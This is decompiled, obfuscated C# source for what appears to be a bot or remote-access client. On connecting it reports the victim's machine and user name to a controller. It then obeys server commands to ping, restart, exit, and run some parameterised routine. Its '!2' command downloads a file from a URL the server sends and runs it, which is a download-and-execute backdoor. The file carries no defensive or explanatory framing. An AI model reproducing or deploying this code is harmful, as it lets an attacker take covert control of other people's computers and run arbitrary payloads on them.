using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class7
{
	[AccessedThroughProperty("w")]
	private static GClass3 gclass3_0;

	public static string string_0;

	public static string string_1;

	public static GClass0 gclass0_0;

	public static bool bool_0;

	public static bool bool_1;

	static Class7()
	{
		smethod_3(new GClass3());
		string_0 = "\\|?/";
		bool_1 = false;
	}

	public static byte[] smethod_0(ref string string_2)
	{
		return Encoding.Default.GetBytes(string_2);
	}

	public static string smethod_1(ref byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public static GClass3 smethod_2()
	{
		return gclass3_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	public static void smethod_3(GClass3 gclass3_1)
	{
		GClass3.GDelegate1 gdelegate1_ = smethod_4;
		GClass3.GDelegate0 gdelegate0_ = smethod_5;
		GClass3.GDelegate2 gdelegate2_ = smethod_6;
		if (gclass3_0 != null)
		{
			gclass3_0.method_3(gdelegate1_);
			gclass3_0.method_1(gdelegate0_);
			gclass3_0.method_5(gdelegate2_);
		}
		gclass3_0 = gclass3_1;
		if (gclass3_0 != null)
		{
			gclass3_0.method_2(gdelegate1_);
			gclass3_0.method_0(gdelegate0_);
			gclass3_0.method_4(gdelegate2_);
		}
	}

	public static void smethod_4()
	{
		bool_0 = false;
		bool_1 = false;
	}

	public static void smethod_5()
	{
		bool_0 = true;
		smethod_2().method_10("!2" + string_0 + Environment.MachineName + "\\" + Environment.UserName + string_0 + Conversions.ToString(GClass1.int_2) + "|" + Conversions.ToString(GClass0.gclass1_0.string_0.Length) + string_0 + Conversions.ToString(GClass1.int_1) + string_0 + Conversions.ToString(GClass0.gclass1_0.string_2.Length) + string_0 + GClass1.string_1 + string_0 + Conversions.ToString(checked(GClass1.int_0 + 1)) + string_0 + gclass0_0.string_0);
		bool_1 = true;
	}

	public static void smethod_6(byte[] byte_0)
	{
		string text = smethod_1(ref byte_0);
		string[] array = Strings.Split(text, string_0, -1, (CompareMethod)0);
		checked
		{
			try
			{
				switch (array[0])
				{
				case "DM":
					GClass1.string_1 = array[1];
					smethod_2().method_10("!4" + string_0 + "$" + string_0 + GClass1.string_1);
					break;
				case "p":
					smethod_2().method_10("p");
					break;
				case "inx":
					if ((double)(GClass0.gclass1_0.string_0.Length - 1) < Conversions.ToDouble(array[1]))
					{
						GClass1.int_2 = 0;
					}
					else
					{
						GClass1.int_2 = Conversions.ToInteger(array[1]);
					}
					break;
				case "!0":
					gclass0_0.method_0(Conversions.ToInteger(array[1]), array[2], Conversions.ToInteger(array[3]));
					smethod_2().method_10("!4" + string_0 + "#" + string_0 + Conversions.ToString(GClass0.gclass1_0.string_2.Length));
					smethod_2().method_10("!4" + string_0 + "$" + string_0 + GClass1.string_1);
					smethod_2().method_10("!4" + string_0 + "%" + string_0 + Conversions.ToString(GClass1.int_0));
					break;
				case "!1":
					switch (array[1])
					{
					case "!":
						gclass0_0.method_3();
						break;
					case "@":
						Process.Start(Application.get_ExecutablePath());
						ProjectData.EndApp();
						break;
					case "#":
						ProjectData.EndApp();
						break;
					}
					break;
				case "!2":
				{
					string text2 = "." + Strings.Split(array[1], ".", -1, (CompareMethod)0)[Strings.Split(array[1], ".", -1, (CompareMethod)0).Length - 1];
					int num = smethod_7(ref string_1, text2);
					WebClient webClient = new WebClient();
					File.WriteAllBytes(string_1 + Conversions.ToString(num) + text2, webClient.DownloadData(array[1]));
					Process.Start(string_1 + Conversions.ToString(num) + text2);
					break;
				}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static int smethod_7(ref string string_2, string string_3)
	{
		int num = 0;
		do
		{
			if (File.Exists(string_2 + Conversions.ToString(num) + string_3))
			{
				num = checked(num + 1);
				continue;
			}
			return num;
		}
		while (num <= 9999);
		int result = default(int);
		return result;
	}
}
